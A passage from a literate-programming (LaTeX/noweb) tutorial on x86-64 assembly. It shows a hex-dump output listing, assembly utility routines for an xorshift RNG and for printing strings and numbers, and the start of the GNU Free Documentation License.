7c 90 65 b3 e9 09 28 2c 03 d3 b2 8f aa e4 89 6f - 7c 90 65 b3 ae 09 28 2c 03 d3 b2 8f aa ea 89 6f 
a4 29 8d 30 78 8c 85 22 5d 7a 52 f2 f1 1e 29 1e - a4 29 8d 30 78 8c 85 22 5d 7a 52 9d e1 1e 29 1e 
4a 21 13 83 37 48 78 00 88 3d ab 26 a5 bd 59 62 - 4a 21 13 83 37 48 78 00 88 3d ab 26 a5 bd 59 62 
33 dd 4b e8 65 6c 53 ee ca 3c 2e f8 31 01 5b c9 - 33 d3 4b e1 65 6c 53 e8 ca 3c 2e 74 31 01 5b c9 
6f c4 d3 86 40 33 95 35 7e 2d 52 ec 80 89 4a 96 - 6f c4 d3 86 40 33 95 35 7e 2d 52 e1 80 89 4a 96 
9d ad 27 28 b7 09 18 6f a0 0a f5 ab f0 f1 80 5e - 9d ad 27 28 b7 09 18 6f a0 0a ac ab e5 bb 80 5e 
4f e4 64 57 99 56 41 b6 d0 22 d5 0e 77 85 61 fb - 4f e1 64 57 99 56 41 b6 d0 22 d5 0e 77 85 61 e1 
90 12 2f b2 6e 6f da 5f d5 68 c3 54 19 53 e3 02 - 90 12 2f b2 6e 6f da 5f d5 68 c3 54 19 53 e1 02 
79 ac 88 78 ba e5 f0 cd 39 6e be f9 a5 d4 53 bb - 79 ac 88 78 ba d3 b3 cd 39 6e be e1 a5 d4 53 bb 
86 9c 25 f9 5c 42 1a 1c f4 e6 6c de 0d b2 fa 14 - 86 9c 25 e1 5c 42 1a 1c f6 fd 6c c5 0d b2 bb 14 
50 59 dd 15 4b c3 17 60 f4 01 a3 97 7a bd 22 04 - 50 59 d5 15 4b c3 17 60 e5 01 a3 97 7a bd 22 04 
3c 43 37 22 94 64 44 80 1f bd 0a 96 ab 84 8e f4 - 3c 43 37 22 94 64 44 80 1f bd 0a 96 ab 84 8e e9 
66 22 65 a7 b2 9d 15 66 03 5b d5 61 79 95 1e 9c - 66 22 65 a7 b2 9d 15 66 03 5b d5 61 79 95 1e 9c 
01 d6 83 98 20 63 33 aa 6b 01 b7 0c e6 f3 d8 7f - 01 d6 83 98 20 63 33 aa 6b 01 b7 0c e1 e1 d8 7f 
b4 65 24 55 dd a6 c3 eb 71 63 11 7c 8e 02 92 5f - b4 65 24 55 f8 a6 c3 e1 71 63 11 7c 8e 02 92 5f 
8f 60 ba e7 1a 7e d1 de f3 94 5a d3 31 36 52 b9 - 8f 60 ba 2f 1a 7e d1 e1 ac 94 5a d3 31 36 52 b9 
9b 56 19 0d be 8a 8e de 12 e7 f0 f4 7b b0 48 ea - 9b 56 19 0d be 8a 8e 61 12 e5 fd e5 7b b0 48 d3 
58 65 b2 74 d4 53 36 3b 32 c5 d9 d8 ad 54 81 ef - 58 65 b2 74 d4 53 36 3b 32 c5 d9 d8 ad 54 81 c5 
c7 52 86 67 28 61 02 16 5b cb ce 1e a9 d9 1c 33 - c7 52 86 67 28 61 02 16 5b cb ce 1e a9 d9 1c 33 
1d 1a 1c ad 72 0b aa e5 10 3b 47 3c c2 86 8f bf - 1d 1a 1c ad 72 0b aa b3 10 3b 47 3c c2 86 8f bf 
49 cc ab a5 58 c9 72 58 74 f7 60 2a 53 cb 43 a5 - 49 cc ab a5 58 c9 72 58 74 c8 60 2a 53 cb 43 a5 
a7 6d 11 59 55 49 13 e0 e9 14 0c ae 81 76 b5 be - a7 6d 11 59 55 49 13 41 e1 14 0c ae 81 76 b5 be 
d3 88 ce 1c 19 49 45 77 6a c3 a6 12 ef 27 b7 93 - d3 88 ce 1c 19 49 45 77 6a c3 a6 12 fd 27 b7 93 
0a 75 15 9e 50 87 31 26 9d 0b aa cd d1 53 e4 17 - 0a 75 15 9e 50 87 31 26 9d 0b aa cd d1 53 d5 17 
de 9e 59 2e ff 53 c8 ad a4 e4 4b 51 2b 3b 31 96 - ac 9e 59 2e fd 53 c8 ad a4 e1 4b 51 2b 3b 31 96 
a1 73 d4 9b 51 77 ab a1 d1 2e 67 27 6f 9e 10 95 - a1 73 d4 ac 51 77 ab a1 d1 2e 67 27 6f 9e 10 95 
21 9d 7a 5d 8e f3 09 d5 72 80 70 84 ed c3 af 1b - 21 9d 7a 5d 8e fd 09 d5 72 80 70 84 e5 c3 af 1b 
84 52 90 99 e4 f7 d3 eb 13 93 c8 30 86 aa f6 77 - 84 52 90 99 bb cc d3 ac 13 93 c8 30 86 aa e8 77 
75 41 61 f6 12 44 be 17 0c 1a b1 38 74 69 e2 65 - 75 41 61 e1 12 44 be 17 0c 1a b1 38 74 69 e1 65 
52 5f 53 31 ce 73 9f 0d 9d 85 3e 9f 3b 49 2d be - 52 5f 53 31 ce 73 9f 0d 9d 85 3e 9f 3b 49 2d be 
7e 75 4e f6 ce 88 d4 24 28 57 6f 0c cd a9 ce 37 - 7e 75 4e f8 ce 88 d4 24 28 57 6f 0c cd a9 ce 37 
76 6e 18 bc 3d 25 08 8b aa 9f 57 7a 1b f4 f1 bd - 76 6e 18 bc 3d 25 08 8b aa 9f 57 7a 1b e1 9b bd 
e2 61 28 ed 68 7c 9e c3 41 36 7c 8e 7b 51 36 1e - cc 61 28 ac 68 7c 9e c3 41 36 7c 8e 7b 51 36 1e 
97 35 32 57 b7 77 9b 21 21 b0 db a2 8e b3 20 4f - 97 35 32 57 b7 77 9b 21 21 b0 db a2 8e b3 20 4f 
e6 bb 7a 73 45 55 cb a4 f4 dc 11 02 53 46 67 08 - ea bb 7a 73 45 55 cb a4 e8 dc 11 02 53 46 67 08 
a5 96 07 f5 cc 9c b5 fd 9a 40 ab 8b 86 59 b6 94 - a5 96 07 e5 cc 9c b5 7d 9a 40 ab 8b 86 59 b6 94 
e5 7e 50 af c3 5a 1d b1 c1 cb e3 52 8c 3f e4 58 - e1 7e 50 af c3 5a 1d b1 c1 cb e5 52 8c 3f e1 58 
c6 d0 af 3d bd 10 59 31 5a 9a 99 7a d3 28 8d 73 - c6 d0 af 3d bd 10 59 31 5a 9a 99 7a d3 28 8d 73 
98 50 73 04 a8 92 6c a2 34 dc 08 37 13 04 47 bd - 98 50 73 04 a8 92 6c a2 34 dc 08 37 13 04 47 bd 
d1 14 6c e5 6a e2 36 99 37 9a 0b ea b1 e4 eb b0 - d1 14 6c 9d 6a e5 36 99 37 9a 0b f8 b1 e4 85 b0 
6f f3 c9 43 1d 9a 21 c9 ac a2 2a b6 f3 21 95 ad - 6f e7 c9 43 1d e1 21 c9 ac a2 2a b6 ea 21 95 ad 
e6 e1 c3 3c b9 32 1f 5f bd 8d 41 90 86 d5 39 9f - fd ac c3 3c b9 32 1f 5f bd 8d 41 90 86 d5 39 9f 
02 af a1 14 e2 0b 7e 09 83 d3 47 c8 98 f9 c2 74 - 02 af a1 14 ea 0b 7e 09 83 d3 47 c8 98 e5 c2 74 
60 60 cc 55 80 9c c1 e1 a8 40 6f 98 35 6a 35 7f - 60 60 cc 55 80 9c c1 cf a8 40 6f 98 35 6a 35 7f 
8c c2 07 9c 47 64 98 ee af 5c 0e a0 22 a5 ea 18 - 8c c2 07 9c 47 64 98 e1 af 5c 0e a0 22 a5 e1 18 
a5 a3 96 c5 d4 61 a3 2d 18 e2 a1 72 49 68 ba 92 - a5 a3 96 cf d4 61 a3 2d 18 e1 a1 72 49 68 ba 92 
90 d5 d7 29 62 38 d2 bf ad 85 1e e3 78 b3 cc 46 - 90 d5 d7 29 62 38 d2 bf ad 85 1e d5 78 b3 cc 46 
09 be d8 c4 25 07 27 b0 c4 67 b2 48 c1 59 16 8d - 09 be d8 c4 25 07 27 b0 c4 67 b2 48 c1 59 16 8d 
16 00 e5 83 45 ed 1d 5f ff bf 12 b4 29 ef 48 9e - 16 00 f6 83 45 e5 1d 5f e1 bf 12 b4 29 e1 48 9e 
1f 51 1c f6 00 6f ce fb f7 f6 e0 f3 68 6d f2 4a - 1f 51 1c e1 00 6f ce e5 e9 d3 e1 e1 68 6d bb 4a 
27 b6 b2 ec 9c 68 b7 f4 8e 6d 38 2d 8a 04 be 31 - 27 e1 b2 e9 9c 68 b7 e1 8e 6d 38 2d 8a 04 be 31 
bd bf c8 d4 62 ba d0 a4 2c d6 08 c0 0a 52 6a 83 - bd bf c8 d4 62 ba d0 a4 2c d6 08 c0 0a 52 6a 83 
7f a5 45 ec 4a 48 a7 45 bd 9d 65 39 54 62 9d d0 - 7f a5 45 e5 4a 48 a7 45 bd 9d 65 39 54 62 9d d0 
df 5b 2c e6 f4 23 a6 c7 18 e1 cc 78 8f fe 1d 79 - fd 5b 2c e8 e5 23 a6 c7 18 d5 cc 78 8f e1 1d 79 
c9 c0 43 1f e4 bf 00 8c 5a 31 72 e4 b6 2e 7d e9 - c9 c0 43 1f f6 bf 00 8c 5a 31 72 ea b6 2e 7d e1 
83 d4 d2 d9 62 51 1c eb ba 1e 34 47 ab a5 84 58 - 83 d4 d2 d9 62 51 1c e1 ba 1e 34 47 ab a5 84 58 
d3 d5 05 4a 0c 7c 46 e7 8f e5 3a 30 8a 4a ed fd - d3 d5 05 4a 0c 7c 46 e5 8f e1 3a 30 8a 4a f6 e1 
54 3a 38 c3 cd d5 29 4a 25 fd 99 62 db 04 93 fa - 54 3a 38 c3 cd d5 29 4a 25 e5 99 62 db 04 93 ae 
3f 12 0d db da 1d 13 50 ce c5 a0 46 82 72 3c 9d - 3f 12 0d db da 1d 13 50 ce c5 a0 46 82 72 3c 9d 
b4 5d eb 7e 5a 34 e7 be ec 55 e7 55 61 c2 0b 54 - b4 5d e1 7e 5a 34 d5 be 55 55 e5 55 61 c2 0b 54 
02 7c b9 a4 5e 4a 16 ec f0 86 ee 8e e8 94 25 98 - 02 7c b9 a4 5e 4a 16 cb f6 86 de 8e e9 94 25 98 
34 b7 a8 7d f3 50 8e 02 db c3 9a da cb b7 dd de - 34 b7 a8 7d ea 50 8e 02 db c3 9a da cb b7 d5 fd 
f9 98 b8 6c 6a 62 57 8b 07 2d 58 84 9b 32 e9 be - e5 98 b8 6c 6a 62 57 8b 07 2d 58 84 00 32 00 be 
06 c6 f9 8f da ee 12 50 fe af fc b4 9f 90 6c 01 - 00 c6 00 8f da 00 00 00 00 af 00 b4 00 90 00 00 
20 1d 98 fc 7e 35 b0 18 51 b4 e0 dd 64 cd 34 a6 - 20 00 00 00 7e 35 b0 00 00 b4 e0 dd 64 cd 34 00 
a8 07 92 cc fb 72 8f 00 f3 d7 dc 34 a2 fc 7e 6a - 00 07 92 00 00 00 8f 00 00 00 dc 00 a2 00 7e 6a 
Failed read relation: 543/4096

real	0m16.653s
user	0m16.510s
sys	0m0.032s
$ 
\end{verbatim}

\chapter{Signals}

\section{Basics}

TBD

\section{Detecting Signals}

TBD

\section{Handling Signals}

TBD

\chapter{Utilities}

\section{Introduction}

TBD

<<utilities>>=
<<nprint>>

<<print>>

<<printdu64bit>>

<<printh8bit>>
@

\section{Common Chunks}

\subsection{Exit Program}

This chunk ends the program with exit code 0.

<<exitProgram>>=
     xor       RDI,RDI
     mov       RAX,60
     syscall
@

\subsection{Stack Frame}

A chunk to create a stack frame.

<<enterstackframe>>=
     push      RBP
     mov       RBP,RSP
@

A chunk to clean up the created stack frame.

<<leavestackframe>>=
     mov       RSP,RBP
     pop       RBP
@

\section{Random Number Generator}

To initialize the data a \gls{rng} is used. The sample programs use
xorshift\footnote{\url{https://en.wikipedia.org/wiki/Xorshift}} as \gls{rng}.

First we clear the direction flag to ensure that we are incrementing the data pointer \verb|RDI|.

Next we move the number of values to be generated to \verb|RCX| (which is a counter in \gls{x86} processors) and divide
it by 4 (because we use a 32bit \gls{rng}). Additionally we move the seed to \verb|EAX|.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the address of the memory which is to be filled with random numbers
\item [RSI] the number of bytes that are filled with random numbers. This must be a multiple of 4
\item [EDX] the seed of the \gls{rng}
\end{labeling}

<<xorshift-prng>>=
_xorshift:
     cld
     mov       RCX,RSI
     shr       RCX,2
     mov       EAX,EDX
@ %def _xorshift

Now we can generate the next 32bit random number.

<<xorshift-prng>>=
.next_random:
     mov       EBX,EAX
     shl       EAX,13
     xor       EAX,EBX
     mov       EBX,EAX
     shr       EAX,17
     xor       EAX,EBX
     mov       EBX,EAX
     shl       EAX,5
     xor       EAX,EBX
@

Because we want to generate multiple random numbers we store the value of \verb|EAX| to \verb|[RDI]| and loop for the
next random number.

<<xorshift-prng>>=
     stosd
     loop      .next_random
     ret
@

\section{Printing Strings}

\subsection{Printing Strings with Length}

The routine [[_nprint]] prints a string with the given length to \verb|stdout|.

We move the number of bytes to print to \verb|RDX| which is the 3rd parameter to the systemcall. Next we move the
address of the bytes to print to \verb|RSI| which is the 2nd parameter to the systemcall. The 1st argument
(in \verb|RDI|) to the systemcall is the file descriptor (\verb|1| is stdout). Additionally the number of the systemcall
(\verb|1|) is passed in \verb|RAX|. The systemcall (\verb|syscall|) now prints \verb|RDX| bytes from \verb|[RSI]| to the
file descriptor \verb|RDI|.

At the end we return to the caller.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the number of bytes to print to \verb|stdout|
\item [RSI] the address to the bytes to print to \verb|stdout|
\end{labeling}

<<nprint>>=
_nprint:
     mov       RDX,RDI
     mov       RDI,1
     mov       RAX,1
     syscall
     ret
@ %def _nprint

\subsection{Printing C-Strings}

The routine [[_print]] prints a null-terminated string to \verb|stdout|.

First we clear the direction flag to increment the address in \verb|RDI| while scanning the data.

Next we start with clearing \verb|AL| (setting it to null) and saving the address of the string to \verb|RSI|. We're
using \verb|RSI| because we later need the address to calculate the length of the string.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the address to the null-terminated bytes to print to \verb|stdout|
\end{labeling}

<<print>>=
_print:
     cld
     xor       AL,AL
     mov       RSI,RDI
@ %def _print

Next we search for the terminating \verb|null| ('\verb|\0|') character. For this we use the instruction \verb|scasb|
(scan string byte) which compares the byte at the address \verb|[RDI]| with the value in \verb|AL| and sets the flags
accordingly. When the byte at \verb|[RDI]| is not the value of \verb|AL| the next instruction (\verb|jne|) jumps to the
given label (\verb|.next_char| in this case).

\verb|scasb| additionally increments \verb|RDI| so that we go through the string until '\verb|\0|' is found.

<<print>>=
.next_char:
     scasb
     jne       .next_char
@

After we have found the string termination we calculate the number of bytes that the string has. In \verb|RSI| we now
have the starting address of the bytes to print and in \verb|RDI| we have the end address of the bytes to print. After
that we calculate the number of bytes to print.

<<print>>=
     sub       RDI,RSI
@

Now we have the address of the string in \verb|RDI| and the length of the string in \verb|RSI| which are the 1st and 2nd
argument in the call of [[_nprint]].

<<print>>=
     call      _nprint
     ret
@

\section{Printing Numbers}

\subsection{Printing a Decimal 64bit Unsigned Integer}

The routine [[_printdu64bit]] prints a given 64bit integer as unsigned decimal number to \verb|stdout|.

To print a decimal number we have to divide the number by 10 and get the remainder for printing (from right to left).
For this we move the divisor to a register and the dividend to \verb|RAX|. We have to use \verb|RAX| because this is the
only register we can use for division.

Additionally we need the address of the scratch area in \verb|RDI| for storing the result. We also save the address of
the scratch area to \verb|R8| for later use.

To increment the address during the processing we clear the direction flag.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the number number to print to \verb|stdout|
\item [RSI] the address of a scratch area with a size of at least 20~bytes
\end{labeling}

<<printdu64bit>>=
_printdu64bit:
     mov       RAX,RDI
     mov       RDI,RSI
     mov       R8,RDI
     mov       RCX,10
     cld
@ %def _printdu64bit

Now we define a label to jump back when we see that there are still more digits to print. Then we test \verb|RAX| for 0
and end the processing of the digits.

<<printdu64bit>>=
.next:
     cmp       RAX,0
     je        .done
@

Next we divide \verb|RAX| by \verb|RCX|. For this we have to clear \verb|RDX| because this is the higher value of the
dividend. The result is then placed into \verb|RAX| and the remainder into \verb|RDX|.

<<printdu64bit>>=
     xor       RDX,RDX
     div       RCX
@

We now exchange the result and the remainder because we now need the remainder in \verb|RAX| (or \verb|AL|) for further
processing. Now we can add the \gls{ascii} character '0' to AL and have the correct \gls{ascii} value in AL. Now we can
store the \gls{ascii} character to the scratch area.

<<printdu64bit>>=
     xchg      RDX,RAX
     add       AL,'0'
     stosb
@

Now we restore \verb|RAX| (which we saved to \verb|RDX|) to go into the next round.

<<printdu64bit>>=
     mov       RAX,RDX
     jmp       .next
@

Now that we have all the numbers as \gls{ascii} characters we are nearly done. We now have to reverse the number in
memory because the number saved at the lowest address is the digit with the least significance.

We now start with checking if we have written any character. If not then we write the \gls{ascii} character '0' into the
memory. We use the instruction \verb|stosb| for this to adjust the address in \verb|RDI| at the same time.

<<printdu64bit>>=
.done:
     cmp       RDI,RSI
     jne       .printout
     mov       AL,'0'
     stosb
.printout:
@

Next we calculate the number of digits that the number has. For this we move the address of the last digit to \verb|RDX|
and subtract the start of the scratch area from this. Next we adjust \verb|RDI| because it points to the first address
after the number.

<<printdu64bit>>=
     mov       RDX,RDI
     sub       RDX,RSI
     dec       RDI
@

We now have \verb|RSI| with the address of the start of the number and \verb|RDI| with the address of the end. We now
have to exchange the digits from the front and the end to get the right number. For this we increment \verb|RSI| and
decrement \verb|RDI| after each exchange and when the addresses pass each other we are done.

<<printdu64bit>>=
.reverse:
     mov       AL,[RSI]
     mov       AH,[RDI]
     mov       [RSI],AH
     mov       [RDI],AL
     dec       RDI
     inc       RSI
     cmp       RSI,RDI
     jb        .reverse
@

Now we restore the address of the scratch area to \verb|RSI| and move the number of digits (which we stored in
\verb|RDX|) to \verb|RDI| and can the call [[_nprint]] to print the number.

<<printdu64bit>>=
     mov       RSI,R8
     mov       RDI,RDX
     call      _nprint
     ret
@

\subsection{Printing a Hexadecimal 8bit Integer}

The routine [[_printh8bit]] prints a given 8bit integer as hexadecimal number to \verb|stdout|.

To print a hexadecimal number we mask a nibble (4bit) and have the number to print.

First we clear the register \verb|RAX| and move the number to \verb|AX| for further processing and clear the higher 8bit
(\verb|AH|). Additionally we move it to \verb|R8| for later restore.

Additionally we need the address of the scratch area in \verb|RDI| for storing the result.

To increment the address during the processing we clear the direction flag.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [DI] the number number to print to \verb|stdout|. Only the lower 8bit are used.
\item [RSI] the address of a scratch area with a size of at least 2~bytes
\end{labeling}

<<printh8bit>>=
_printh8bit:
     xor       RAX,RAX
     mov       AX,DI
     xor       AH,AH
     mov       R8,RAX
     mov       RDI,RSI
     cld
@ %def _printh8bit

Now we mask the higher 4~bit of AL by shifting it 4~bits to the right and mask out all but the lower 4~bit. Next we
call the internal method [[printh8bit.printh4bit]] to print out this nibble.

<<printh8bit>>=
     shr       AL,4
     and       AL,0x0f
     call      .printh4bit
@

Next we restore the number and print out the lower 4~bits.

<<printh8bit>>=
     mov       RAX,R8
     and       AL,0x0f
     call      .printh4bit
     mov       RDI,2
     call      _nprint
     ret
<<printh8bit.printh4bit>>
@

Now we define the internal method to print a hexadecimal digit.

First we test if the digit is above or equal to 10. In this case we have to print out a character between \verb|'a'| and
\verb|'f'| else we print out a decimal digit (between \verb|'0'| and \verb|'9'|).

\paragraph{Parameters (internal)}
\begin{labeling}{[XXX-XXX]}
\item [AL] the lower 4~bit contain the hexadecimal digit print to \verb|stdout|
\item [RDI] the address of a scratch area
\end{labeling}

<<printh8bit.printh4bit>>=
.printh4bit:
     cmp       AL,10
     jae       .printa2f
@ %def printh8bit.printh4bit

Now we add \verb|'0'| to get the code for the digit between \verb|'0'| and \verb|'9'|.

<<printh8bit.printh4bit>>=
     add       AL,'0'
     jmp       .printout
@

Else we print a digit between \verb|'a'| and \verb|'f'|. We first subtract 10 because the value in \verb|AL| is now
between 10 and 15.

<<printh8bit.printh4bit>>=
.printa2f:
     sub       AL,10
     add       AL,'a'
@

Now we store the character into the storage area.

<<printh8bit.printh4bit>>=
.printout:
     stosb
     ret
@

\appendix

\printglossary

\printacronyms

\printglossary[type=ins]

\chapter{Code Chunks}

\nowebchunks

\chapter{License}

\section{GNU Free Documentation License}

This license applies to this documentation as a whole.

\begin{Verbatim}[fontsize=\small]
                GNU Free Documentation License
                 Version 1.3, 3 November 2008


 Copyright (C) 2000, 2001, 2002, 2007, 2008 Free Software Foundation, Inc.
     <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

0. PREAMBLE

The purpose of this License is to make a manual, textbook, or other
functional and useful document "free" in the sense of freedom: to
assure everyone the effective freedom to copy and redistribute it,
with or without modifying it, either commercially or noncommercially.
Secondarily, this License preserves for the author and publisher a way
to get credit for their work, while not being considered responsible
for modifications made by others.

This License is a kind of "copyleft", which means that derivative
works of the document must themselves be free in the same sense.  It
complements the GNU General Public License, which is a copyleft
license designed for free software.

We have designed this License in order to use it for manuals for free
software, because free software needs free documentation: a free
program should come with manuals providing the same freedoms that the
software does.  But this License is not limited to software manuals;
it can be used for any textual work, regardless of subject matter or
whether it is published as a printed book.  We recommend this License
principally for works whose purpose is instruction or reference.


1. APPLICABILITY AND DEFINITIONS

This License applies to any manual or other work, in any medium, that
contains a notice placed by the copyright holder saying it can be
distributed under the terms of this License.  Such a notice grants a
world-wide, royalty-free license, unlimited in duration, to use that
work under the conditions stated herein.  The "Document", below,
refers to any such manual or work.  Any member of the public is a
licensee, and is addressed as "you".  You accept the license if you
copy, modify or distribute the work in a way requiring permission
under copyright law.

A "Modified Version" of the Document means any work containing the
Document or a portion of it, either copied verbatim, or with
modifications and/or translated into another language.

A "Secondary Section" is a named appendix or a front-matter section of
the Document that deals exclusively with the relationship of the
publishers or authors of the Document to the Document's overall
subject (or to related matters) and contains nothing that could fall
directly within that overall subject.  (Thus, if the Document is in
part a textbook of mathematics, a Secondary Section may not explain
any mathematics.)  The relationship could be a matter of historical
connection with the subject or with related matters, or of legal,
commercial, philosophical, ethical or political position regarding
them.

The "Invariant Sections" are certain Secondary Sections whose titles
are designated, as being those of Invariant Sections, in the notice
that says that the Document is released under this License.  If a
section does not fit the above definition of Secondary then it is not
allowed to be designated as Invariant.  The Document may contain zero
Invariant Sections.  If the Document does not identify any Invariant
Sections then there are none.

The "Cover Texts" are certain short passages of text that are listed,
as Front-Cover Texts or Back-Cover Texts, in the notice that says that
the Document is released under this License.  A Front-Cover Text may
be at most 5 words, and a Back-Cover Text may be at most 25 words.

A "Transparent" copy of the Document means a machine-readable copy,
represented in a format whose specification is available to the
general public, that is suitable for revising the document
straightforwardly with generic text editors or (for images composed of
pixels) generic paint programs or (for drawings) some widely available
drawing editor, and that is suitable for input to text formatters or
for automatic translation to a variety of formats suitable for input
to text formatters.  A copy made in an otherwise Transparent file
format whose markup, or absence of markup, has been arranged to thwart
or discourage subsequent modification by readers is not Transparent.
An image format is not Transparent if used for any substantial amount
of text.  A copy that is not "Transparent" is called "Opaque".

Examples of suitable formats for Transparent copies include plain
ASCII without markup, Texinfo input format, LaTeX input format, SGML
or XML using a publicly available DTD, and standard-conforming simple
HTML, PostScript or PDF designed for human modification.  Examples of
transparent image formats include PNG, XCF and JPG.  Opaque formats
include proprietary formats that can be read and edited only by
proprietary word processors, SGML or XML for which the DTD and/or
processing tools are not generally available, and the
machine-generated HTML, PostScript or PDF produced by some word
processors for output purposes only.

The "Title Page" means, for a printed book, the title page itself,
plus such following pages as are needed to hold, legibly, the material
this License requires to appear in the title page.  For works in
formats which do not have any title page as such, "Title Page" means
the text near the most prominent appearance of the work's title,
preceding the beginning of the body of the text.

The "publisher" means any person or entity that distributes copies of
the Document to the public.

A section "Entitled XYZ" means a named subunit of the Document whose
title either is precisely XYZ or contains XYZ in parentheses following
text that translates XYZ in another language.  (Here XYZ stands for a
specific section name mentioned below, such as "Acknowledgements",
"Dedications", "Endorsements", or "History".)  To "Preserve the Title"
of such a section when you modify the Document means that it remains a
section "Entitled XYZ" according to this definition.

The Document may include Warranty Disclaimers next to the notice which
states that this License applies to the Document.  These Warranty
Disclaimers are considered to be included by reference in this
License, but only as regards disclaiming warranties: any other
implication that these Warranty Disclaimers may have is void and has
no effect on the meaning of this License.

2. VERBATIM COPYING

You may copy and distribute the Document in any medium, either
commercially or noncommercially, provided that this License, the
copyright notices, and the license notice saying this License applies
to the Document are reproduced in all copies, and that you add no
other conditions whatsoever to those of this License.  You may not use
technical measures to obstruct or control the reading or further
copying of the copies you make or distribute.  However, you may accept
compensation in exchange for copies.  If you distribute a large enough
number of copies you must also follow the conditions in section 3.

You may also lend copies, under the same conditions stated above, and
you may publicly display copies.


3. COPYING IN QUANTITY

If you publish printed copies (or copies in media that commonly have
printed covers) of the Document, numbering more than 100, and the
Document's license notice requires Cover Texts, you must enclose the
copies in covers that carry, clearly and legibly, all these Cover
Texts: Front-Cover Texts on the front cover, and Back-Cover Texts on
the back cover.  Both covers must also clearly and legibly identify
you as the publisher of these copies.  The front cover must present
the full title with all words of the title equally prominent and
visible.  You may add other material on the covers in addition.
Copying with changes limited to the covers, as long as they preserve
the title of the Document and satisfy these conditions, can be treated
as verbatim copying in other respects.

If the required texts for either cover are too voluminous to fit
legibly, you should put the first ones listed (as many as fit
reasonably) on the actual cover, and continue the rest onto adjacent
pages.

If you publish or distribute Opaque copies of the Document numbering
more than 100, you must either include a machine-readable Transparent
copy along with each Opaque copy, or state in or with each Opaque copy
a computer-network location from which the general network-using
public has access to download using public-standard network protocols
a complete Transparent copy of the Document, free of added material.
If you use the latter option, you must take reasonably prudent steps,
when you begin distribution of Opaque copies in quantity, to ensure
that this Transparent copy will remain thus accessible at the stated
location until at least one year after the last time you distribute an
Opaque copy (directly or through your agents or retailers) of that
edition to the public.

It is requested, but not required, that you contact the authors of the
Document well before redistributing any large number of copies, to
give them a chance to provide you with an updated version of the
Document.


4. MODIFICATIONS

You may copy and distribute a Modified Version of the Document under
the conditions of sections 2 and 3 above, provided that you release
the Modified Version under precisely this License, with the Modified
Version filling the role of the Document, thus licensing distribution
and modification of the Modified Version to whoever possesses a copy
of it.  In addition, you must do these things in the Modified Version:

A. Use in the Title Page (and on the covers, if any) a title distinct
   from that of the Document, and from those of previous versions
   (which should, if there were any, be listed in the History section
   of the Document).  You may use the same title as a previous version
   if the original publisher of that version gives permission.
B. List on the Title Page, as authors, one or more persons or entities
   responsible for authorship of the modifications in the Modified
   Version, together with at least five of the principal authors of the
   Document (all of its principal authors, if it has fewer than five),
   unless they release you from this requirement.
C. State on the Title page the name of the publisher of the
   Modified Version, as the publisher.
D. Preserve all the copyright notices of the Document.
E. Add an appropriate copyright notice for your modifications
   adjacent to the other copyright notices.
F. Include, immediately after the copyright notices, a license notice
   giving the public permission to use the Modified Version under the
   terms of this License, in the form shown in the Addendum below.
G. Preserve in that license notice the full lists of Invariant Sections
   and required Cover Texts given in the Document's license notice.
H. Include an unaltered copy of this License.
I. Preserve the section Entitled "History", Preserve its Title, and add
   to it an item stating at least the title, year, new authors, and
   publisher of the Modified Version as given on the Title Page.  If
   there is no section Entitled "History" in the Document, create one
   stating the title, year, authors, and publisher of the Document as
   given on its Title Page, then add an item describing the Modified
   Version as stated in the previous sentence.
J. Preserve the network location, if any, given in the Document for
   public access to a Transparent copy of the Document, and likewise
   the network locations given in the Document for previous versions
   it was based on.  These may be placed in the "History" section.
   You may omit a network location for a work that was published at
   least four years before the Document itself, or if the original
   publisher of the version it refers to gives permission.
K. For any section Entitled "Acknowledgements" or "Dedications",
   Preserve the Title of the section, and preserve in the section all
   the substance and tone of each of the contributor acknowledgements
   and/or dedications given therein.
L. Preserve all the Invariant Sections of the Document,
   unaltered in their text and in their titles.  Section numbers
   or the equivalent are not considered part of the section titles.
M. Delete any section Entitled "Endorsements".  Such a section
   may not be included in the Modified Version.
N. Do not retitle any existing section to be Entitled "Endorsements"
   or to conflict in title with any Invariant Section.
O. Preserve any Warranty Disclaimers.

If the Modified Version includes new front-matter sections or
appendices that qualify as Secondary Sections and contain no material
copied from the Document, you may at your option designate some or all
of these sections as invariant.  To do this, add their titles to the
list of Invariant Sections in the Modified Version's license notice.
These titles must be distinct from any other section titles.

You may add a section Entitled "Endorsements", provided it contains
nothing but endorsements of your Modified Version by various
parties--for example, statements of peer review or that the text has
been approved by an organization as the authoritative definition of a
standard.

You may add a passage of up to five words as a Front-Cover Text, and a
passage of up to 25 words as a Back-Cover Text, to the end of the list
of Cover Texts in the Modified Version.  Only one passage of
Front-Cover Text and one of Back-Cover Text may be added by (or
through arrangements made by) any one entity.  If the Document already
includes a cover text for the same cover, previously added by you or
by arrangement made by the same entity you are acting on behalf of,
you may not add another; but you may replace the old one, on explicit
permission from the previous publisher that added the old one.

The author(s) and publisher(s) of the Document do not by this License
give permission to use their names for publicity for or to assert or
imply endorsement of any Modified Version.


5. COMBINING DOCUMENTS

You may combine the Document with other documents released under this
License, under the terms defined in section 4 above for modified
versions, provided that you include in the combination all of the
Invariant Sections of all of the original documents, unmodified, and
list them all as Invariant Sections of your combined work in its
license notice, and that you preserve all their Warranty Disclaimers.

The combined work need only contain one copy of this License, and
multiple identical Invariant Sections may be replaced with a single
copy.  If there are multiple Invariant Sections with the same name but
different contents, make the title of each such section unique by
adding at the end of it, in parentheses, the name of the original
author or publisher of that section if known, or else a unique number.
Make the same adjustment to the section titles in the list of
Invariant Sections in the license notice of the combined work.

In the combination, you must combine any sections Entitled "History"
in the various original documents, forming one section Entitled
"History"; likewise combine any sections Entitled "Acknowledgements",
and any sections Entitled "Dedications".  You must delete all sections
Entitled "Endorsements".


6. COLLECTIONS OF DOCUMENTS

You may make a collection consisting of the Document and other
documents released under this License, and replace the individual
copies of this License in the various documents with a single copy
that is included in the collection, provided that you follow the rules
of this License for verbatim copying of each of the documents in all
other respects.

You may extract a single document from such a collection, and
distribute it individually under this License, provided you insert a
copy of this License into the extracted document, and follow this
License in all other respects regarding verbatim copying of that
document.


7. AGGREGATION WITH INDEPENDENT WORKS

